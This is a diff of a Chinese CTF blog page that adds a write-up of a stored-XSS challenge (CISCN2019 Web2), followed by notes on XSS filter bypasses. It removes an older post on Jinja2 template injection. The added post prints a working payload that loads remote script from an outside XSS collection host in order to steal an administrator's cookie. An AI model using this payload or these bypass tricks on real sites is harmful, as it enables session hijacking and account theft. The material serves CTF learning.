@@ -169,6 +169,91 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-xxs" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/03/31/xxs/" class="article-date">
+  	<time datetime="2021-03-31T12:14:19.000Z" itemprop="datePublished">2021-03-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/03/31/xxs/">
+        ctf xss利用_xss总结
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>[CISCN2019 华东北赛区]Web2</h1>
+<h2>题目</h2>
+
+<p><img src="/2021/03/31/xxs/1.png"><br>题目有两个窗口，吐槽和登录<br>没有注册界面，直接吐槽叭</p>
+<h2>题解</h2>
+
+<p>尝试弹窗<code>&lt;script&gt;alert(1)&lt;/script&gt</code><br>emmm并没有任何东西跳出来，那我们换一个html标签试试：<code>&lt;IMG SRC=&quot;javascript.:alert(&#039;XSS&#039;);&quot;&gt</code><br><img src="/2021/03/31/xxs/2.png"><br>有个不为人知的图片，看来是存在xxs漏洞了<br>吐槽页面是用来放XSS的，然后在反馈给管理员这样我们就能拿到管理员的cookie，因为这里是内网环境，所以只能去 <a target="_blank" rel="noopener" href="http://xss.buuoj.cn/index.php?do=login">http://xss.buuoj.cn/index.php?do=login</a> 注册账号来接收cookie。</p>
+<pre>&lt;/textarea&gt;'"&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2Fxss.buuoj.cn%2F8sVXk7%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//&gt;
+</pre>
+<p>代码写在吐槽上提交，访问，在xxs平台上就可以看到cookie和访问链接：<br><img src="/2021/03/31/xxs/3.png"><br>利用管理员的cookie，以及来访地址…node3.buuoj.cn/backend/admin.php登录即可得到flag（用chrome的edit this cookie插件比较方便）<br><img src="/2021/03/31/xxs/4.png"></p>
+<h1>知识点</h1>
+<h2>0x01xss作用</h2>
+
+<p>emm完全不知道xxs是什么的我看了赵大佬的讲座，附上学习链接，记得白嫖：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1XE411f7qT?from=search&seid=6094814016757224378">我爱学习~~</a><br>常见的输出函数：print()、 print_r()、 echo、 printf()、 sprintf()、 die()、 var_dump()、 var_export()<br>xss是往页面中添加了一段代码，并且被浏览器执行了<br>反射型将恶意代码写入参数，或者自己服务器上搭个form表单传送，用来钓鱼<br>存储型就等着别人点这个网页就行了</p>
+<h2>0x02手段</h2>
+
+<p>xss主要出现的地方：文章发表，评论回复，留言，资料设置等<br>xss无非就是要对方的cookie，但是常常会有httponly导致cookie并不能传到xss平台，这是一种有效的防御方式<br>但是xss预防应该从本质出发，即对该页面用户输入不能被执行<br>xss触发方法<br>利用script标签执行js<br>字符串用” ‘ 包裹都行<br>采用on事件方法<br>on事件不用单引号或双引号也可以触发，但是必须闭合标签内的引号<br>=&gt;点击就会触发 =&gt;鼠标移动触发<br>能够使用on事件的标签<br>支持on click事件的标签有</p>
+<ul>
+<li>, , , , ,
+</li><li>, , ,
+</li><li>, , , , ,
+</li><li>, , , , ,,
+</li><li>to
+</li><li>, , , , , ,
+</li></ul>
+
+<p>采用a标签来做到xss</p>
+<h2>0x03bypass方法</h2>
+
+<p>采用编码，把字符串可以进行编码<br>后接十进制 =&gt; unicode编码<br>​ 后接十六进制 =&gt; unicode编码<br>采用标签中的空隙规则<br>假设正则是<br>]*)&gt;([\s\S][^<br>可以采用<br>==&gt; 最后有个p和&gt;间有空格绕过<br>采用双写绕过空字符替换<br>如果被删除关键字，可以采用重写方法比如<br>用大小写绕过不严格的waf<br>采用参数覆盖，覆盖掉hidden参数<br>我们输入的内容为：” onmouseover=alert(1) type=”text<br>有些标签的优先级高于”,导致执行xss</p>
+<p>最后不明白那段代码是个什么意思，xxs也没改明白，在慢慢研究吧！</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-pop" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1126,80 +1211,6 @@ git checkout v5.0.23
 
 <p><img src="/2021/02/15/hack/g.png"><br>得到flag~~</p>
 
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-guge" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/02/14/guge/" class="article-date">
-  	<time datetime="2021-02-14T07:45:30.000Z" itemprop="datePublished">2021-02-14</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/14/guge/">
-        24-buu练习[BJDCTF 2nd]fake google 1
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2>知识点</h2>
-
-<p><b style="color:pink">Tornado和Jinja2</b>，这两个都是以两组花括号作为变量包裹标识符：<br><img src="/2021/02/14/guge/g3.png"></p>
-<ul>
-<li>利用漏洞命令执行或者信息泄露，信息泄露有一些敏感的配置信息，而命令执行就能很直观的进行操作。例如文件读写。
-</li><li>然后是确定如何操作，查看可用模块里可执行函数，比如os.system可以执行系统命令，os.popen()可以读取文件等。
-</li><li>再就是对题目的过滤进行绕过。可能会对某些危险函数禁用或者过滤函数名。可用编码、拼接，替换等方式绕过。
-</li></ul>
-
-<p>有关ssti的payload：<br><img src="/2021/02/14/guge/g7.png"><br>相关函数的解释:</p>
-<ul>
-<li>__class__ 返回类型所属的对象
-</li><li>__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
-</li><li>__init__ 类的初始化方法
-</li><li>__globals__ 对包含函数全局变量的字典的引用
-</li><li>__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
-<li.__bases__ 返回该对象所继承的基类 __builtins__是做为默认初始模块 < ul>
-<h2>题目</h2>
-
-<p>题目出来后，是一个搜索页面，f12也没什么发现，在搜索框输入1：<br><img src="/2021/02/14/guge/g1.png"><br>搜索后出现以下内容：<br><img src="/2021/02/14/guge/g2.png"><br>ssti模板注入，又是崭新的东西=……=|||，虽然前面做过了一题tornado模板的，但是差别很大，我太难了||||<br>既然是ssti模板注入，尝试一下，比如说，在搜索框中输入4，会显示4 ，说明后端有处理渲染。<br>用下面的流程图测试一下，看看是什么模板引擎：<br><img src="/2021/02/14/guge/g4.png"><br>用Payload测试之后发现是jinjia2的模板引擎，然后构造jinjia2 ssti的命令执行payload：<br><img src="/2021/02/14/guge/g5.png"><br><img src="/2021/02/14/guge/g6.png"><br>的到flag！~<br>这道题是真的不知道是个什么情况=….=，看大佬博客也搞不清楚状况，只能这样了<br>参考：<br>SSTI模板注入参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aef2ae0498df">https://www.jianshu.com/p/aef2ae0498df</a><br>ssti/沙盒逃逸详细总结：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172#h2-13">https://www.anquanke.com/post/id/188172#h2-13</a><br>服务段模板注入攻击：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p>
-</li.__bases__></li></ul>
       
     </div>
     
